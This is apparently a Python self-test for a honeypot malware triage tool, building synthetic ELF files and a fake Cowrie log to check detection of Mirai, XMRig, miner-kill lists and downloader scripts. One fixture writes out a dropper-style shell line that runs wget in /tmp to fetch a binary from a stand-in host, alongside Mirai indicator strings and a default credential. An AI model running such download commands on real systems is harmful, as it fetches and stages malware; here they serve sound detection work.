#!/usr/bin/env python3
# Self-check for triage_downloads.py using synthetic files (no real malware):
# ELF header parsing, Mirai's XOR-0x22 string table, plaintext credential
# overlap with the logged passwords, and arrival details from the log.
# Run: python3 scripts/test_triage_downloads.py

import hashlib
import json
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))


def fake_elf(machine, big_endian, body):
    order = "big" if big_endian else "little"
    hdr = b"\x7fELF" + bytes([1, 2 if big_endian else 1, 1]) + b"\0" * 9
    hdr += (2).to_bytes(2, order) + machine.to_bytes(2, order)
    return hdr + b"\0" * 32 + body


def xor22(s):
    return bytes(c ^ 0x22 for c in s)


def main():
    mirai = fake_elf(8, True, b"\0" + xor22(b"TSource Engine Query") + b"\0"
                     + b"xc3511\0bash\0" + b"6.6.6.6:23\0")
    miner = fake_elf(62, False, b"\0xmrig\0rx/0\0")
    killer = fake_elf(40, False, b"\0pkill xmrig\0--donate-level\0")
    script = b"#!/bin/sh\ncd /tmp; wget http://198.51.100.7/x.arm7 -O x\n"
    with tempfile.TemporaryDirectory() as d:
        dl = os.path.join(d, "downloads")
        os.mkdir(dl)
        shas = {}
        for name, blob in (("mirai", mirai), ("script", script),
                           ("miner", miner), ("killer", killer)):
            sha = hashlib.sha256(blob).hexdigest()
            shas[name] = sha
            with open(os.path.join(dl, sha), "wb") as fh:
                fh.write(blob)
        log = os.path.join(d, "cowrie.json")
        events = [
            {"eventid": "cowrie.login.failed", "password": "xc3511"},
            {"eventid": "cowrie.login.failed", "password": "xc3511"},
            {"eventid": "cowrie.login.failed", "password": "bash"},
            {"eventid": "cowrie.session.file_download", "shasum": shas["mirai"],
             "url": "http://198.51.100.7/x.mips", "src_ip": "203.0.113.5",
             "timestamp": "2026-09-01T00:00:00.000000Z"},
        ]
        with open(log, "w") as fh:
            fh.write("\n".join(json.dumps(e) for e in events) + "\n")
        out = os.path.join(d, "triage.json")
        subprocess.run([sys.executable, os.path.join(HERE, "triage_downloads.py"),
                        dl, "--log", log, "--out", out],
                       check=True, stdout=subprocess.DEVNULL)
        with open(out) as fh:
            report = json.load(fh)

    by = {s["sha256"]: s for s in report["samples"]}
    m, s = by[shas["mirai"]], by[shas["script"]]
    assert m["detail"] == "MIPS 32-bit big-endian", m["detail"]
    assert m["verdict"] == "Mirai", m["verdict"]
    assert m["families"]["Mirai"] == ["xor: TSource Engine Query"], m["families"]
    assert m["shared_credentials"] == ["xc3511"], m["shared_credentials"]  # not "bash"
    assert "6.6.6.6:23" in m["ips"], m["ips"]
    assert m["arrival"]["src_ips"] == ["203.0.113.5"], m["arrival"]
    assert report["password_tries"] == {"xc3511": 2}, report["password_tries"]
    assert s["kind"] == "script" and s["verdict"] == "downloader script", s
    assert s["urls"] == ["http://198.51.100.7/x.arm7"], s["urls"]
    assert "arrival" not in s
    assert by[shas["miner"]]["verdict"] == "XMRig", by[shas["miner"]]["verdict"]
    assert by[shas["killer"]]["verdict"] == "bot with miner kill list", \
        by[shas["killer"]]["verdict"]
    print("ok")


if __name__ == "__main__":
    main()
